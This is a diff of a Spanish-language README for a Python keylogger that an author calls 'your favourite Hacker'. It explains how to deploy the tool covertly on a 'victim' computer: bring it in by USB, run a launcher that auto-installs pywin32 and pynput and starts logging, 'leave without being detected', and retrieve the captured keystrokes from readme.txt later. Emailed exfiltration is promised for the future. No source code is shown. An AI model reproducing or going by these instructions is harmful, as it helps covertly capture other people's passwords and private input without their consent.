@@ -1,17 +1,22 @@
+
+![Logo](https://cdn-icons-png.flaticon.com/512/1918/1918491.png)
+
 # Keylogger-Basico-En-Python
-Un keylogger hecho en Python.
+Un keylogger hecho en Python por tu Hacker favorito.
 
 # COMO UTILIZAR
 
-- 1º Instalar los modulos pip necesarios en el ordenador de la victima (Requiere Python Instalado) 
-
- - py -m pip install pywin32
- 
- - py -m pip install pynput
+- 1º Instalar Python3 si no esta ya instalado en la maquina victima.
  
 - 2º Introducirlo mediante USB o lo que te sea mas conveniente (AVISO: EL DOCUMENTO "readme.txt" SE CREARA EN LA CARPETA DONDE SE ENCUENTRE EL KEYLOGGER)
 
-- 3º Ejecutar a traves de la terminal
+- 3º Ejecutar "Launcher.py" a traves de la terminal, Autoinstalara los modulos:
+
+  - Pywin32
+ 
+  - Pynput
+
+  - Launcher.py ejecutara automaticamente el keylogger despues de instalar los modulos mencionados anteriormente para asegurar el correcto funcionamiento del mismo.
 
 - 4º Irte sin ser detectado
 
@@ -19,3 +24,9 @@ Un keylogger hecho en Python.
 readme.txt de la forma que sea mas conveniente (EN UN FUTURO SE ENVIARA AUTOMATICAMENTE A TRAVES DE EMAIL)
 
 HAPPY HACKING :)
+
+
+## [@MahmoudElGrande](https://www.github.com/MahmoudElGrande)
+
+
+
